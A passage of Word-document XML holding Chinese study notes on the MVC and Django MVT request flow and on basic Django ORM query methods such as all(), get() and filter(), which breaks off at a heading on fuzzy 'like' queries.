    <w:p w14:paraId="1CAA05FF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="220" w:name="7935-1535452116467"/>
      <w:bookmarkEnd w:id="220"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（6）Controller 控制器收到保存的结果之后，或告诉 View 视图，view 视图产生一个 html 页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B4D377" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="221" w:name="3070-1535452116467"/>
      <w:bookmarkEnd w:id="221"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（7）View 将产生的 Html 页面的内容给了 Controller 控制器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51214F2D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="222" w:name="8957-1535452116467"/>
      <w:bookmarkEnd w:id="222"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（8）Controller将Html页面的内容返回给浏览器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E74E1D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="223" w:name="4882-1535452186216"/>
      <w:bookmarkEnd w:id="223"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（9）浏览器接受到服务器 Controller 返回的 Html 页面进行解析展示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15AC5D12" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="224" w:name="8389-1535452267709"/>
      <w:bookmarkStart w:id="225" w:name="8840-1535452273635"/>
      <w:bookmarkEnd w:id="224"/>
      <w:bookmarkEnd w:id="225"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MVT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107B274D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="226" w:name="4254-1535452116467"/>
      <w:bookmarkEnd w:id="226"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>M：Model，模型，和 MVC 中的 M 功能相同，和数据库进行交互。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9F6B72" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="227" w:name="9382-1535452116467"/>
      <w:bookmarkEnd w:id="227"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>V：view，视图，和 MVC 中的 C 功能相同，接收请求，进行处理，与 M 和 T 进行交互，返回应答。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E9D048" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="228" w:name="4430-1535452116467"/>
      <w:bookmarkEnd w:id="228"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>T：Template，模板，和 MVC 中的 V 功能相同，产生 Html 页面.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E801CC" w14:textId="7C214E43" w:rsidR="001C47AF" w:rsidRDefault="001C47AF" w:rsidP="001C47AF">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="229" w:name="8000-1535452290009"/>
      <w:bookmarkEnd w:id="229"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F23664F" wp14:editId="438CF7E6">
            <wp:extent cx="6292850" cy="3171671"/>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18115" cy="3184405"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C99A5F6" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="230" w:name="8440-1535452290009"/>
      <w:bookmarkEnd w:id="230"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）用户点击注册按钮，将要注册的内容发送给网站的服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D809757" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="231" w:name="1019-1535452311524"/>
      <w:bookmarkEnd w:id="231"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2） View 视图，接收到用户发来的注册数据，View 告诉 Model 将用户的注册信息保存进数据库。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793ADA04" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="232" w:name="9066-1535452311524"/>
      <w:bookmarkEnd w:id="232"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）Model 层将用户的注册信息保存到数据库中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CABD91" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="233" w:name="1946-1535452311524"/>
      <w:bookmarkEnd w:id="233"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（4）数据库将保存的结果返回给 Model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D75618" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="234" w:name="8769-1535452311524"/>
      <w:bookmarkEnd w:id="234"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（5）Model 将保存的结果给 View 视图。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150E9836" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="235" w:name="2461-1535452311524"/>
      <w:bookmarkEnd w:id="235"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（6）View 视图告诉 Template 模板去产生一个 Html 页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF1F9A6" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="236" w:name="8112-1535452311524"/>
      <w:bookmarkEnd w:id="236"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（7）Template 生成 html 内容返回给 View 视图。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0351B0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="237" w:name="3428-1535452311524"/>
      <w:bookmarkEnd w:id="237"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（8）View 将 html 页面内容返回给浏览器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4361947E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="238" w:name="7090-1535452311524"/>
      <w:bookmarkEnd w:id="238"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（9） 浏览器拿到 view 返回的 html 页面内容进行解析，展示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118A9186" w14:textId="07DA0246" w:rsidR="001C47AF" w:rsidRDefault="0057133E" w:rsidP="001C47AF">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="239" w:name="2700-1535452402929"/>
      <w:bookmarkStart w:id="240" w:name="2390-1535452413128"/>
      <w:bookmarkEnd w:id="239"/>
      <w:bookmarkEnd w:id="240"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>004</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w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>models</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>利用</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Mysql </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>进行查表的语句（多个语句）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFD7CCD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="241" w:name="5614-1535452428542"/>
      <w:bookmarkEnd w:id="241"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>字段查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A98404" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="242" w:name="9393-1535452429121"/>
      <w:bookmarkEnd w:id="242"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>all():返回模型类对应表格中的所有数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003A4222" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="243" w:name="8151-1535452429121"/>
      <w:bookmarkEnd w:id="243"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>get():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5607BA10" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="244" w:name="8295-1539936609090"/>
      <w:bookmarkEnd w:id="244"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>返回表格中满足条件的一条数据，如果查到多条数据，则抛异常：MultipleObjectsReturned， 查询不到数据，则抛异常：DoesNotExist。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0179DBFF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="245" w:name="7127-1539936606136"/>
      <w:bookmarkStart w:id="246" w:name="5323-1535452429121"/>
      <w:bookmarkEnd w:id="245"/>
      <w:bookmarkEnd w:id="246"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>filter():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF981E1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="247" w:name="3450-1539936613773"/>
      <w:bookmarkEnd w:id="247"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>参数写查询条件，返回满足条件 QuerySet 集合数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F87015" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="248" w:name="6671-1539936644152"/>
      <w:bookmarkEnd w:id="248"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>条件格式：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F07E51" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="249" w:name="5562-1535452429121"/>
      <w:bookmarkEnd w:id="249"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>**模型类属性名** 条件名=值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162AB51B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="250" w:name="6169-1535452429121"/>
      <w:bookmarkEnd w:id="250"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意：此处是模型类属性名，不是表中的字段名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7291D0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="251" w:name="9348-1535452520148"/>
      <w:bookmarkEnd w:id="251"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>关于 filter 具体案例如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6950E3ED" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="252" w:name="1042-1535452532650"/>
      <w:bookmarkEnd w:id="252"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>判等exact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F44F59B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="253" w:name="6451-1535452551748"/>
      <w:bookmarkEnd w:id="253"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookInfo.object.filter(id=1) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738F1478" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="254" w:name="1493-1535452569695"/>
      <w:bookmarkEnd w:id="254"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookInfo.object.filter(id exact=1)此处的 exact 可以省略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531145A4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="255" w:name="1011-1535452491959"/>
      <w:bookmarkEnd w:id="255"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模糊查询  like</w:t>
      </w:r>
    </w:p>
